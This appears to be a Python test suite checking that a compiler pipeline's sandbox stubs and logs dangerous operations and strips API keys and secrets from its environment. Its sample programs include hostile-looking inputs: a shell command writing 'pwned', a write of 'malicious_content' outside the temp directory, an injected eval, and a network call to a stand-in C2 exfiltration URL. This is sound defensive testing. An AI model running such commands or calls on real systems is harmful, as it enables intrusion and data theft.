# -*- coding: utf-8 -*-
"""
tests/test_stage13_sandbox_hardening.py — Tests for Hardened Sandbox Execution in Stage 13

Verifies that Stage 13 cannot harm the host machine:
  1. Dangerous operations (execute_command, eval, file write outside temp, network call)
     are intercepted by recording stubs and logged.
  2. The host filesystem is completely unchanged (no files created/modified outside temp dir).
  3. No dangerous child process is spawned on the host.
  4. API keys and secrets (GEMINI_API_KEY, tokens) are completely stripped from sandbox env.
  5. Blocked calls are reported as RUN-POLICY-VIOLATION findings mapped to the original .vital line.
  6. The educational security override banner states:
     "EXECUTED WITH SECURITY OVERRIDE (dangerous operations were stubbed, not performed)".
  7. Seeded Demo B and Demo C programs execute safely with override without harming host.
"""

import os
import sys
import unittest
import tempfile
import shutil

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SRC_DIR = os.path.join(PROJECT_ROOT, "src")
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from sandbox_policy import (
    get_sanitized_sandbox_env,
    clear_recorded_violations,
    get_recorded_violations,
    build_sandbox_exec_scope,
    install_system_patches,
    ALLOWED_MODULES
)
from web.pipeline_tracker import PipelineRunTracker, execute_pipeline_with_tracker
from web.compiler_runner import run_pipeline


class TestStage13SandboxHardening(unittest.TestCase):

    def setUp(self):
        clear_recorded_violations()

    def tearDown(self):
        clear_recorded_violations()

    def test_env_sanitization_strips_api_keys_and_secrets(self):
        """Sanitized sandbox environment must strip GEMINI_API_KEY and any credential env vars."""
        old_env = os.environ.copy()
        try:
            os.environ["GEMINI_API_KEY"] = "super-secret-gemini-key-9999"
            os.environ["SECRET_TOKEN"] = "sensitive-token-abc"
            os.environ["DATABASE_PASSWORD"] = "secret-pass"
            os.environ["CUSTOM_API_KEY_VAL"] = "key-value"

            temp_dir = tempfile.mkdtemp(prefix="test_env_")
            try:
                env = get_sanitized_sandbox_env(temp_dir)
                self.assertNotIn("GEMINI_API_KEY", env)
                self.assertNotIn("SECRET_TOKEN", env)
                self.assertNotIn("DATABASE_PASSWORD", env)
                self.assertNotIn("CUSTOM_API_KEY_VAL", env)
                self.assertEqual(env["TEMP"], temp_dir)
                self.assertEqual(env["TMP"], temp_dir)
                self.assertEqual(env["PYTHONUTF8"], "1")
                self.assertEqual(env["VITAL_SANDBOX"], "1")
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)
        finally:
            os.environ.clear()
            os.environ.update(old_env)

    def test_mock_dangerous_command_execution_stubbed(self):
        """execute_command stub intercepts command, logs it, records violation, and does not spawn child process."""
        target_marker_file = os.path.join(PROJECT_ROOT, "tests", "should_never_exist_cmd.txt")
        if os.path.exists(target_marker_file):
            os.remove(target_marker_file)

        code = (
            "print('Starting command test')\n"
            "let res = execute_command('echo pwned > " + target_marker_file.replace("\\", "/") + "')\n"
            "print('Command status:')\n"
            "print(res)\n"
            "print('Finished command test')\n"
        )

        tracker = PipelineRunTracker(run_id="test-cmd-stub")
        execute_pipeline_with_tracker(
            source_code=code,
            language_hint="English",
            run_ai_security=False,
            tracker=tracker,
            pause_on_error=False,
            security_override=True
        )

        # Host filesystem must remain untouched: marker file was never created
        self.assertFalse(os.path.exists(target_marker_file), "Marker file must NOT be created on host!")

        st13 = tracker.stages.get("sandbox_execution", {})
        details = st13.get("details", {})
        findings = details.get("findings", [])
        
        # Must report RUN-POLICY-VIOLATION
        policy_findings = [f for f in findings if f.get("rule_id") == "RUN-POLICY-VIOLATION"]
        self.assertGreaterEqual(len(policy_findings), 1)
        self.assertEqual(policy_findings[0]["line"], 2)
        self.assertIn("execute_command", policy_findings[0]["evidence"])

        # Output must show the stub log and continued execution
        output = details.get("output", "")
        self.assertIn("[sandbox] blocked execute_command", output)
        self.assertIn("Finished command test", output)

    def test_mock_dangerous_file_write_outside_temp_blocked(self):
        """File write outside temporary directory is blocked; file is not written to host."""
        host_leak_file = os.path.join(PROJECT_ROOT, "tests", "host_leak_payload.txt")
        if os.path.exists(host_leak_file):
            os.remove(host_leak_file)

        code = (
            "print('Starting file write test')\n"
            "let fw = file_write('" + host_leak_file.replace("\\", "/") + "', 'malicious_content')\n"
            "print('Finished file write test')\n"
        )

        tracker = PipelineRunTracker(run_id="test-file-write-stub")
        execute_pipeline_with_tracker(
            source_code=code,
            language_hint="English",
            run_ai_security=False,
            tracker=tracker,
            pause_on_error=False,
            security_override=True
        )

        self.assertFalse(os.path.exists(host_leak_file), "Host leak file must NOT exist on host!")

        st13 = tracker.stages.get("sandbox_execution", {})
        details = st13.get("details", {})
        findings = details.get("findings", [])
        policy_findings = [f for f in findings if f.get("rule_id") == "RUN-POLICY-VIOLATION"]
        self.assertGreaterEqual(len(policy_findings), 1)
        self.assertEqual(policy_findings[0]["line"], 2)

        output = details.get("output", "")
        self.assertIn("[sandbox] blocked file_write", output)
        self.assertIn("Finished file write test", output)

    def test_mock_dangerous_dynamic_eval_stubbed(self):
        """Dynamic eval is intercepted by recording stub and does not execute arbitrary code."""
        code = (
            "print('Starting eval test')\n"
            "eval('print(\"Arbitrary code injection executed!\")')\n"
            "print('Finished eval test')\n"
        )

        tracker = PipelineRunTracker(run_id="test-eval-stub")
        execute_pipeline_with_tracker(
            source_code=code,
            language_hint="English",
            run_ai_security=False,
            tracker=tracker,
            pause_on_error=False,
            security_override=True
        )

        st13 = tracker.stages.get("sandbox_execution", {})
        details = st13.get("details", {})
        findings = details.get("findings", [])
        policy_findings = [f for f in findings if f.get("rule_id") == "RUN-POLICY-VIOLATION"]
        self.assertGreaterEqual(len(policy_findings), 1)
        self.assertEqual(policy_findings[0]["line"], 2)

        output = details.get("output", "")
        self.assertIn("[sandbox] blocked eval", output)
        # Standalone print inside eval must NOT have been executed
        output_lines = [line.strip() for line in output.splitlines()]
        self.assertNotIn("Arbitrary code injection executed!", output_lines)
        self.assertIn("Finished eval test", output)

    def test_mock_network_call_blocked(self):
        """Network call is intercepted by stub without opening any host socket."""
        code = (
            "print('Starting network test')\n"
            "let net_res = network_call('https://malicious-external-c2.com/exfiltrate')\n"
            "print('Finished network test')\n"
        )

        tracker = PipelineRunTracker(run_id="test-net-stub")
        execute_pipeline_with_tracker(
            source_code=code,
            language_hint="English",
            run_ai_security=False,
            tracker=tracker,
            pause_on_error=False,
            security_override=True
        )

        st13 = tracker.stages.get("sandbox_execution", {})
        details = st13.get("details", {})
        findings = details.get("findings", [])
        policy_findings = [f for f in findings if f.get("rule_id") == "RUN-POLICY-VIOLATION"]
        self.assertGreaterEqual(len(policy_findings), 1)
        self.assertEqual(policy_findings[0]["line"], 2)

        output = details.get("output", "")
        self.assertIn("[sandbox] blocked network_call", output)
        self.assertIn("Finished network test", output)

    def test_override_banner_text_exact_match(self):
        """Override banner must state: 'EXECUTED WITH SECURITY OVERRIDE (dangerous operations were stubbed, not performed)'."""
        code = (
            "let x = 1\n"
            "print(x)\n"
        )
        tracker = PipelineRunTracker(run_id="test-banner-text")
        execute_pipeline_with_tracker(
            source_code=code,
            language_hint="English",
            run_ai_security=False,
            tracker=tracker,
            pause_on_error=False,
            security_override=True
        )

        output = tracker.artifacts.get("output", "")
        self.assertIn("[EXECUTED WITH SECURITY OVERRIDE]", output)
        self.assertIn(
            "EXECUTED WITH SECURITY OVERRIDE (dangerous operations were stubbed, not performed)",
            output
        )

        report = tracker.artifacts.get("aggregated_log", "")
        self.assertIn(
            "EXECUTED WITH SECURITY OVERRIDE (dangerous operations were stubbed, not performed)",
            report
        )

    def test_seeded_demo_c_educational_override_stubs_dangerous_eval(self):
        """Seeded Demo C with educational override executes safely: eval is stubbed, no host impact."""
        demo_c_path = os.path.join(
            PROJECT_ROOT, "examples", "security_lab", "english", "sec_injection_eval.vital"
        )
        with open(demo_c_path, "r", encoding="utf-8") as f:
            code = f.read()

        tracker = PipelineRunTracker(run_id="test-demo-c-hardened-override")
        execute_pipeline_with_tracker(
            source_code=code,
            language_hint="English",
            run_ai_security=False,
            tracker=tracker,
            pause_on_error=False,
            security_override=True
        )

        # Stage 11 remains failed (the seeded vulnerabilities)
        self.assertEqual(tracker.stages["security_analysis"]["status"], "failed")

        # Stage 13 passed under override with policy findings recorded
        st13 = tracker.stages["sandbox_execution"]
        self.assertEqual(st13["status"], "passed")
        details = st13["details"]
        findings = details.get("findings", [])

        # The seeded eval calls at lines 38 and 46 were stubbed
        policy_findings = [f for f in findings if f.get("rule_id") == "RUN-POLICY-VIOLATION"]
        self.assertGreaterEqual(len(policy_findings), 2)
        lines = [f["line"] for f in policy_findings]
        self.assertIn(38, lines)
        self.assertIn(46, lines)

        # Verify output contains the stub logs and completed cleanly
        output = details.get("output", "")
        self.assertIn("[sandbox] blocked eval", output)
        self.assertIn("Dynamic injection verification harness completed.", output)
        self.assertIn("EXECUTED WITH SECURITY OVERRIDE (dangerous operations were stubbed, not performed)", output)

    def test_seeded_demo_b_educational_override_runs_cleanly_without_host_impact(self):
        """Seeded Demo B with educational override executes safely without writing files or exfiltrating data."""
        demo_b_path = os.path.join(
            PROJECT_ROOT, "examples", "security_lab", "english", "sec_data_config.vital"
        )
        with open(demo_b_path, "r", encoding="utf-8") as f:
            code = f.read()

        tracker = PipelineRunTracker(run_id="test-demo-b-hardened-override")
        execute_pipeline_with_tracker(
            source_code=code,
            language_hint="English",
            run_ai_security=False,
            tracker=tracker,
            pause_on_error=False,
            security_override=True
        )

        self.assertEqual(tracker.stages["security_analysis"]["status"], "failed")
        st13 = tracker.stages["sandbox_execution"]
        self.assertEqual(st13["status"], "passed")
        self.assertEqual(tracker.compute_overall_status(), "EXECUTED_WITH_OVERRIDE")

        output = st13["details"].get("output", "")
        self.assertIn("Configuration processing harness completed.", output)
        self.assertIn("EXECUTED WITH SECURITY OVERRIDE (dangerous operations were stubbed, not performed)", output)


if __name__ == "__main__":
    unittest.main()
